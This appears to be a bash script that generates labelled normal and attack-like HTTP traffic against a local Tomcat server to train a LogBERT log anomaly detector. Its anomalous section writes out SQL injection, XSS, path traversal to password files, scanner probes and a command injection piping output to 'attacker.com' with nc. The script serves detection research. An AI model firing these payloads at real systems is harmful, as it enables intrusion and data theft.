#!/bin/bash

# LogBERT Data Generation Script
# Generates normal and anomalous HTTP traffic patterns for log anomaly detection

echo "=== LogBERT TRAINING DATA GENERATION ==="
echo "Generating normal and anomalous HTTP request patterns..."

BASE_URL="http://localhost:8080"

# Function to generate normal traffic patterns
generate_normal_traffic() {
    echo "Generating NORMAL traffic patterns..."
    
    # Normal e-commerce browsing patterns
    curl -s "$BASE_URL/ecommerce/" > /dev/null
    curl -s "$BASE_URL/ecommerce/products" > /dev/null
    curl -s "$BASE_URL/ecommerce/cart" > /dev/null
    curl -s "$BASE_URL/ecommerce/checkout" > /dev/null
    
    # Normal API usage
    curl -s -H "Content-Type: application/json" "$BASE_URL/rest-api/" > /dev/null
    curl -s -H "Content-Type: application/json" "$BASE_URL/rest-api/api/tasks" > /dev/null
    curl -s -H "Content-Type: application/json" "$BASE_URL/rest-api/api/users" > /dev/null
    
    # Normal blog access
    curl -s "$BASE_URL/blog-cms/" > /dev/null
    curl -s "$BASE_URL/blog-cms/blog" > /dev/null
    curl -s "$BASE_URL/blog-cms/search?q=hello" > /dev/null
    
    # Normal static resource requests
    curl -s "$BASE_URL/ecommerce/css/style.css" > /dev/null
    curl -s "$BASE_URL/ecommerce/js/main.js" > /dev/null
    curl -s "$BASE_URL/ecommerce/images/logo.png" > /dev/null
    
    sleep 1
}

# Function to generate anomalous traffic patterns (attack-like)
generate_anomalous_traffic() {
    echo "Generating ANOMALOUS traffic patterns..."
    
    # SQL Injection patterns
    curl -s "$BASE_URL/ecommerce/products?id=1' OR '1'='1" > /dev/null
    curl -s "$BASE_URL/blog-cms/search?q=' UNION SELECT * FROM users--" > /dev/null
    curl -s "$BASE_URL/rest-api/api/users?id=1; DROP TABLE users;" > /dev/null
    
    # XSS patterns
    curl -s "$BASE_URL/blog-cms/search?q=<script>alert('xss')</script>" > /dev/null
    curl -s "$BASE_URL/ecommerce/products?name=<img src=x onerror=alert(1)>" > /dev/null
    curl -s "$BASE_URL/rest-api/api/tasks?filter=<svg onload=alert(document.cookie)>" > /dev/null
    
    # Path Traversal patterns
    curl -s "$BASE_URL/ecommerce/../../etc/passwd" > /dev/null
    curl -s "$BASE_URL/blog-cms/../../../windows/system32/config/sam" > /dev/null
    curl -s "$BASE_URL/rest-api/api/files?path=../../../etc/shadow" > /dev/null
    
    # Command Injection patterns
    curl -s "$BASE_URL/ecommerce/search?cmd=ls -la | nc attacker.com 4444" > /dev/null
    curl -s "$BASE_URL/blog-cms/upload?file=; cat /etc/passwd" > /dev/null
    curl -s "$BASE_URL/rest-api/api/exec?cmd=whoami && id" > /dev/null
    
    # Large/malformed requests (DoS patterns)
    curl -s -H "User-Agent: $(python3 -c 'print("A" * 10000)')" "$BASE_URL/ecommerce/" > /dev/null
    curl -s "$BASE_URL/blog-cms/$(python3 -c 'print("long/" * 1000)')" > /dev/null
    
    # Scanning patterns
    curl -s "$BASE_URL/admin/" > /dev/null
    curl -s "$BASE_URL/administrator/" > /dev/null
    curl -s "$BASE_URL/phpmyadmin/" > /dev/null
    curl -s "$BASE_URL/wp-admin/" > /dev/null
    curl -s "$BASE_URL/config.php" > /dev/null
    curl -s "$BASE_URL/.env" > /dev/null
    curl -s "$BASE_URL/robots.txt" > /dev/null
    curl -s "$BASE_URL/.git/config" > /dev/null
    
    # HTTP method abuse
    curl -s -X TRACE "$BASE_URL/ecommerce/" > /dev/null
    curl -s -X OPTIONS "$BASE_URL/rest-api/" > /dev/null
    curl -s -X HEAD "$BASE_URL/blog-cms/" > /dev/null
    
    # Suspicious headers
    curl -s -H "X-Forwarded-For: 127.0.0.1" -H "X-Real-IP: 192.168.1.1" "$BASE_URL/ecommerce/" > /dev/null
    curl -s -H "User-Agent: sqlmap/1.0" "$BASE_URL/blog-cms/" > /dev/null
    curl -s -H "User-Agent: Nikto" "$BASE_URL/rest-api/" > /dev/null
    
    sleep 1
}

# Generate multiple rounds of traffic
for i in {1..5}; do
    echo "=== Round $i ==="
    generate_normal_traffic
    generate_anomalous_traffic
    sleep 2
done

echo "=== LogBERT Data Generation Complete ==="
echo "Enhanced access logs available at:"
echo "/Users/majjipradeepkumar/Downloads/apache-tomcat-9.0.109/logs/logbert_access.*.log"
echo ""
echo "Log format includes:"
echo "- Client IP, timestamp, HTTP method/URI/protocol"
echo "- Response status/size, referer, user-agent"
echo "- Content-type, content-length, response time"
echo "- Thread info and session details"
echo ""
echo "Ready for LogBERT model training!"
